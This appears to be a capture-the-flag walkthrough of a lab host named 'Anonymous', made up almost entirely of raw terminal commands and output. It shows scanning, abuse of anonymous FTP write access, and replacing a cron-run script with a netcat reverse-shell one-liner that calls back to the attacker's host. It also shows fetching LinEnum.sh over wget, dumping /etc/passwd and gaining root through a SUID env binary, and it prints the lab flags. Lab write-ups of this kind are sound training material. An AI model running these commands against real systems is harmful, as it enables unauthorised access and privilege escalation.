# [Task 1] Pwn

# nmap
```
root@kali:~# nmap -A -T5 -p-  -v 10.10.193.192
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-21 12:04 UTC
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 12:04
Completed NSE at 12:04, 0.00s elapsed
Initiating NSE at 12:04
Completed NSE at 12:04, 0.00s elapsed
Initiating NSE at 12:04
Completed NSE at 12:04, 0.00s elapsed
Initiating ARP Ping Scan at 12:04
Scanning 10.10.193.192 [1 port]
Completed ARP Ping Scan at 12:04, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:04
Completed Parallel DNS resolution of 1 host. at 12:04, 0.00s elapsed
Initiating SYN Stealth Scan at 12:04
Scanning ip-10-10-193-192.eu-west-1.compute.internal (10.10.193.192) [65535 ports]
Discovered open port 22/tcp on 10.10.193.192
Discovered open port 139/tcp on 10.10.193.192
Discovered open port 21/tcp on 10.10.193.192
Discovered open port 445/tcp on 10.10.193.192
Completed SYN Stealth Scan at 12:05, 3.87s elapsed (65535 total ports)
Initiating Service scan at 12:05
Scanning 4 services on ip-10-10-193-192.eu-west-1.compute.internal (10.10.193.192)
Completed Service scan at 12:05, 11.03s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against ip-10-10-193-192.eu-west-1.compute.internal (10.10.193.192)
Retrying OS detection (try #2) against ip-10-10-193-192.eu-west-1.compute.internal (10.10.193.192)
NSE: Script scanning 10.10.193.192.
Initiating NSE at 12:05
NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
Completed NSE at 12:05, 0.23s elapsed
Initiating NSE at 12:05
Completed NSE at 12:05, 0.02s elapsed
Initiating NSE at 12:05
Completed NSE at 12:05, 0.00s elapsed
Nmap scan report for ip-10-10-193-192.eu-west-1.compute.internal (10.10.193.192)
Host is up (0.00064s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 May 17 21:30 scripts [NSE: writeable]
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.0.67
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
MAC Address: 02:07:99:70:C3:8A (Unknown)
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 3.8 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 40.050 days (since Sat Apr 11 10:53:54 2020)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   ANONYMOUS<00>        Flags: <unique><active>
|   ANONYMOUS<03>        Flags: <unique><active>
|   ANONYMOUS<20>        Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2020-05-21T12:05:15+00:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-05-21T12:05:15
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.64 ms ip-10-10-193-192.eu-west-1.compute.internal (10.10.193.192)

NSE: Script Post-scanning.
Initiating NSE at 12:05
Completed NSE at 12:05, 0.00s elapsed
Initiating NSE at 12:05
Completed NSE at 12:05, 0.00s elapsed
Initiating NSE at 12:05
Completed NSE at 12:05, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.07 seconds
           Raw packets sent: 65580 (2.887MB) | Rcvd: 65564 (2.624MB)
root@kali:~#


root@kali:~# ftp 10.10.193.192
Connected to 10.10.193.192.
220 NamelessOne's FTP Server!
Name (10.10.193.192:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> mget *


root@kali:~# ls
clean.sh  Documents  Music     Public             Templates          to_do.txt
Desktop   Downloads  Pictures  removed_files.log  thinclient_drives  Videos
root@kali:~# cat to_do.txt
I really need to disable the anonymous login...it's really not safe
root@kali:~# cat removed_files.log
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
root@kali:~# cat clean.sh
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
root@kali:~# smbclient //10.10.193.192/anonymous
Enter WORKGROUP\root's password:
tree connect failed: NT_STATUS_BAD_NETWORK_NAME


root@kali:~# nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.193.192
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-21 12:18 UTC
Nmap scan report for ip-10-10-193-192.eu-west-1.compute.internal (10.10.193.192)
Host is up (0.00018s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:07:99:70:C3:8A (Unknown)

Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\10.10.193.192\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (anonymous server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.193.192\pics:
|     Type: STYPE_DISKTREE
|     Comment: My SMB Share Directory for Pics
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\namelessone\pics
|     Anonymous access: READ
|     Current user access: READ
|   \\10.10.193.192\print$:
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
|_smb-enum-users: ERROR: Script execution failed (use -d to debug)

Nmap done: 1 IP address (1 host up) scanned in 0.79 seconds


rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.0.67 1234 >/tmp/f

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 May 14 14:52 clean.sh
-rw-rw-r--    1 1000     1000          387 May 21 12:35 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12 03:50 to_do.txt
226 Directory send OK.
ftp> put clean.sh
local: clean.sh remote: clean.sh
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
78 bytes sent in 0.00 secs (1.9073 MB/s)
ftp> wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww


root@kali:~# nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.0.67] from (UNKNOWN) [10.10.193.192] 38050
/bin/sh: 0: can't access tty; job control turned off
$ ls
pics
user.txt
$ cat user.txt
90d6f992585815ff991e68748c414740
namelessone@anonymous:~$ ls
ls
pics  user.txt
namelessone@anonymous:~$ cd pics
cd pics
namelessone@anonymous:~/pics$ ls
ls
corgo2.jpg  puppos.jpeg
namelessone@anonymous:~/pics$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
namelessone:x:1000:1000:namelessone:/home/namelessone:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
ftp:x:111:113:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
namelessone@anonymous:~/pics$




namelessone@anonymous:~$ wget http://10.10.0.67/LinEnum.sh
wget http://10.10.0.67/LinEnum.sh
--2020-05-21 13:14:37--  http://10.10.0.67/LinEnum.sh
Connecting to 10.10.0.67:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: ‘LinEnum.sh’

LinEnum.sh          100%[===================>]  45.54K  --.-KB/s    in 0s

2020-05-21 13:14:37 (343 MB/s) - ‘LinEnum.sh’ saved [46631/46631]

namelessone@anonymous:~$ chmod +x LinEnum.sh
chmod +x LinEnum.sh
namelessone@anonymous:~$ ./LinEnum.sh

[+] Possibly interesting SUID files:
-rwsr-xr-x 1 root root 35000 Jan 18  2018 /usr/bin/env


$ /usr/bin/env /bin/sh -p
whoami
root
cat /root/root.txt
4d930091c31a622a7ed10f27999af363
```
